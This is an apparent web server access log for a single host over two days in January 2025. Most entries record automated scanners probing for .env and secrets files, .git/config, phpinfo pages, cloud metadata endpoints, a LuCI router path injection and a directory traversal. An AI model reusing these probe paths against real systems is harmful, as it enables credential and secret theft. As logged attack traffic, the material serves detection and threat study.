78.153.140.224 - - [16/Jan/2025:13:30:56 +0000] "GET /secrets.yml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G35 Safari/601.1"
78.153.140.224 - - [16/Jan/2025:13:31:03 +0000] "GET /php-details.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0"
78.153.140.224 - - [16/Jan/2025:13:31:06 +0000] "GET /php-info.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.6 (KHTML, like Gecko) Version/10.0 Mobile/14G57 Safari/602.1"
78.153.140.224 - - [16/Jan/2025:13:31:14 +0000] "GET /php_details.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-au; GT-P5110 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
78.153.140.224 - - [16/Jan/2025:13:31:26 +0000] "GET /phpdetails.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Android; Mobile; rv:20.0) Gecko/20.0 Firefox/20.0"
78.153.140.224 - - [16/Jan/2025:13:31:37 +0000] "GET /.secret HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; WebMoney Advisor; Tablet PC 2.0; InfoPath.2)"
78.153.140.224 - - [16/Jan/2025:13:31:38 +0000] "GET /.secrets HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr-fr) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
78.153.140.224 - - [16/Jan/2025:13:31:43 +0000] "GET /phpinformation.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Android 5.0.2; Mobile; rv:43.0) Gecko/43.0 Firefox/43.0"
78.153.140.224 - - [16/Jan/2025:13:31:50 +0000] "GET /phpinformations.php HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows 2000) Opera 7.0  [en]"
78.153.140.224 - - [16/Jan/2025:13:31:51 +0000] "GET /../.env HTTP/1.1" 400 486 "-" "Opera/7.23 (Windows NT 5.0; U)  [fr]"
78.153.140.224 - - [16/Jan/2025:13:31:57 +0000] "GET /!.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MASPJS; rv:11.0) like Gecko"
78.153.140.224 - - [16/Jan/2025:13:31:59 +0000] "GET /aws.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; da-dk) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3"
78.153.140.224 - - [16/Jan/2025:13:32:02 +0000] "GET /kyc/.env HTTP/1.1" 302 331 "-" "Opera/9.80 (X11; Linux x86_64; U; de) Presto/2.2.15 Version/10.00"
78.153.140.224 - - [16/Jan/2025:13:32:03 +0000] "GET /temp/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 4.4.2; C6725 Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36"
78.153.140.224 - - [16/Jan/2025:13:32:04 +0000] "GET /logs/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1"
78.153.140.224 - - [16/Jan/2025:13:32:05 +0000] "GET /setup/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUS; rv:11.0) like Gecko"
78.153.140.224 - - [16/Jan/2025:13:32:05 +0000] "GET /httpd/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0E)"
78.153.140.224 - - [16/Jan/2025:13:32:05 +0000] "GET /bin/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 4.4.2; en-gb; SAMSUNG GT-I9505 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36"
78.153.140.224 - - [16/Jan/2025:13:32:07 +0000] "GET /twilio/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36"
78.153.140.224 - - [16/Jan/2025:13:32:08 +0000] "GET /legal/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0"
78.153.140.224 - - [16/Jan/2025:13:32:09 +0000] "GET /themes/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9505 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36"
78.153.140.224 - - [16/Jan/2025:13:32:09 +0000] "GET /wwwroot/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.11) Gecko/20071217 Firefox/2.0.0.11"
78.153.140.224 - - [16/Jan/2025:13:32:09 +0000] "GET /configs/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; EIE10;ENUSMSN; rv:11.0) like Gecko"
78.153.140.224 - - [16/Jan/2025:13:32:10 +0000] "GET /www-data/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko)"
78.153.140.224 - - [16/Jan/2025:13:32:10 +0000] "GET /sql/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A347 Safari/525.20"
139.59.101.104 - - [16/Jan/2025:13:33:32 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
3.144.116.195 - - [16/Jan/2025:13:41:22 +0000] "GET //.env HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
3.144.116.195 - - [16/Jan/2025:13:41:22 +0000] "GET / HTTP/1.1" 200 947 "http://34.93.54.196//.env" "Go-http-client/1.1"
59.22.137.135 - - [16/Jan/2025:13:56:21 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
46.19.138.234 - - [16/Jan/2025:14:42:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
61.102.66.112 - - [16/Jan/2025:14:44:30 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
64.226.79.183 - - [16/Jan/2025:15:14:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
95.214.55.226 - - [16/Jan/2025:15:17:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.148 - - [16/Jan/2025:15:34:04 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:15:34:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
52.228.154.220 - - [16/Jan/2025:15:35:33 +0000] "GET /manager/text/list HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
5.181.190.248 - - [16/Jan/2025:15:43:22 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:15:43:23 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
178.215.238.158 - - [16/Jan/2025:15:53:18 +0000] "CONNECT www.baidu.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
45.148.10.242 - - [16/Jan/2025:16:01:22 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
31.13.224.222 - - [16/Jan/2025:16:38:39 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:16:45:08 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:16:45:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
4.151.38.185 - - [16/Jan/2025:16:45:47 +0000] "GET /hudson HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
195.178.110.108 - - [16/Jan/2025:16:56:08 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
195.178.110.108 - - [16/Jan/2025:16:56:58 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
211.46.176.215 - - [16/Jan/2025:17:08:59 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
179.43.191.146 - - [16/Jan/2025:17:09:17 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [16/Jan/2025:17:36:34 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
172.206.147.216 - - [16/Jan/2025:17:37:38 +0000] "MGLNDD_34.93.54.196_80\n" 400 524 "-" "-"
80.82.77.202 - - [16/Jan/2025:17:43:20 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre"
172.104.11.4 - - [16/Jan/2025:17:54:36 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.148 - - [16/Jan/2025:18:11:13 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:18:11:17 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
103.233.123.233 - - [16/Jan/2025:18:26:51 +0000] "GET http://metadata.google.internal/computeMetadata/v1/project/ HTTP/1.1" 302 331 "-" "-"
103.233.123.233 - - [16/Jan/2025:18:26:51 +0000] "GET http://169.254.169.254/computeMetadata/v1/project/ HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:18:32:01 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:18:32:02 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
195.3.223.40 - - [16/Jan/2025:18:36:23 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [16/Jan/2025:19:13:13 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:19:13:13 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
198.235.24.28 - - [16/Jan/2025:19:39:57 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.148.10.242 - - [16/Jan/2025:19:42:55 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [16/Jan/2025:20:15:01 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
172.169.5.242 - - [16/Jan/2025:20:15:08 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
198.235.24.132 - - [16/Jan/2025:20:30:15 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
211.106.212.153 - - [16/Jan/2025:20:43:17 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
46.19.138.234 - - [16/Jan/2025:20:47:24 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.196.220.253 - - [16/Jan/2025:21:04:07 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
78.153.140.148 - - [16/Jan/2025:21:30:03 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:21:30:03 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
3.134.109.31 - - [16/Jan/2025:21:41:15 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
3.134.109.31 - - [16/Jan/2025:21:42:39 +0000] "\x16\x03\x01" 400 524 "-" "-"
18.117.226.111 - - [16/Jan/2025:21:48:35 +0000] "\x16\x03\x01" 400 524 "-" "-"
18.117.226.111 - - [16/Jan/2025:21:49:13 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
5.181.190.248 - - [16/Jan/2025:22:11:31 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:22:11:31 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
89.121.209.61 - - [16/Jan/2025:22:19:16 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
46.19.138.234 - - [16/Jan/2025:22:24:52 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [16/Jan/2025:22:27:22 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:22:27:22 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [16/Jan/2025:22:28:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
206.168.34.205 - - [16/Jan/2025:22:29:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.205 - - [16/Jan/2025:22:29:58 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.205 - - [16/Jan/2025:22:29:59 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.205 - - [16/Jan/2025:22:30:02 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.205 - - [16/Jan/2025:22:30:04 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
185.242.226.10 - - [16/Jan/2025:22:44:14 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
94.143.197.203 - - [16/Jan/2025:22:48:25 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:23:01:57 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [16/Jan/2025:23:01:57 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.120.115.119 - - [16/Jan/2025:23:35:05 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36"
115.86.164.166 - - [15/Jan/2025:00:22:16 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
142.93.221.56 - - [15/Jan/2025:00:44:23 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
163.44.49.196 - - [15/Jan/2025:00:53:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [15/Jan/2025:01:05:12 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:01:05:12 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
182.184.82.29 - - [15/Jan/2025:01:09:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [15/Jan/2025:01:19:40 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:01:19:42 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
170.64.159.7 - - [15/Jan/2025:01:22:38 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:01:37:47 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.191.146 - - [15/Jan/2025:01:40:22 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [15/Jan/2025:01:41:43 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [15/Jan/2025:01:43:25 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:01:43:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.79.181.223 - - [15/Jan/2025:01:45:43 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.179 - - [15/Jan/2025:02:16:00 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.179 - - [15/Jan/2025:02:16:00 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.1.16) Gecko/20080718 Ubuntu/8.04 (hardy) Firefox/2.0.0.16"
78.153.140.179 - - [15/Jan/2025:02:16:00 +0000] "GET /name/.env HTTP/1.1" 302 331 "-" "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.5.22 Version/10.51"
78.153.140.179 - - [15/Jan/2025:02:16:01 +0000] "GET /favs/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPad; CPU iPhone OS 9.3.2 like Mac OS X; en_US) AppleWebKit/1 (KHTML, like Gecko) Mobile/1 Safari/1 iPhone/1 SellOnEtsy/2.38 rv:23800.40.0"
78.153.140.179 - - [15/Jan/2025:02:16:02 +0000] "GET /club/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.34 (KHTML, like Gecko) RelIdApp/3.1.9 Safari/534.34"
78.153.140.179 - - [15/Jan/2025:02:16:02 +0000] "GET /path/.env HTTP/1.1" 302 331 "-" "Opera/ 12.0(x11; Linux x86-64; U; Linux Mint; en) Presto/2.2.15 Version/12.0"
78.153.140.179 - - [15/Jan/2025:02:16:03 +0000] "GET /msks/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.0  [de]"
78.153.140.179 - - [15/Jan/2025:02:16:04 +0000] "GET /util/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPad; CPU OS 10_3 like Mac OS X) AppleWebKit/603.1.29 (KHTML, like Gecko) Version/10.0 Mobile/14E5249d Safari/602.1"
78.153.140.179 - - [15/Jan/2025:02:16:05 +0000] "GET /webs/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; Tablet PC 2.0)"
78.153.140.179 - - [15/Jan/2025:02:16:05 +0000] "GET /repo/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.60"
78.153.140.179 - - [15/Jan/2025:02:16:06 +0000] "GET /info/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; GT-N8013 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
78.153.140.179 - - [15/Jan/2025:02:16:06 +0000] "GET /Hash/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPad; CPU OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
78.153.140.179 - - [15/Jan/2025:02:16:06 +0000] "GET /chai/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU; AppleWebKit/534.16; KHTML; like Gecko; Chrome/10.0.648.11;Safari/534.16)"
78.153.140.93 - - [15/Jan/2025:02:25:11 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:02:25:12 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.120.120.18 - - [15/Jan/2025:02:29:43 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 8.1.0; Mi Note 3 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044813 Mobile Safari/537.36 MMWEBID/6858 MicroMessenger/7.0.5.1440(0x27000537) Process/tools NetType/4G Language/zh_CN"
35.203.210.44 - - [15/Jan/2025:02:37:20 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
133.130.209.119 - - [15/Jan/2025:02:46:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
92.255.57.58 - - [15/Jan/2025:02:52:18 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:02:52:20 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:03:08:47 +0000] "\x16\x03\x01\x05\xa8\x01" 400 524 "-" "-"
78.153.140.148 - - [15/Jan/2025:03:45:45 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:03:45:45 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
109.149.180.53 - - [15/Jan/2025:03:47:15 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [15/Jan/2025:03:59:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
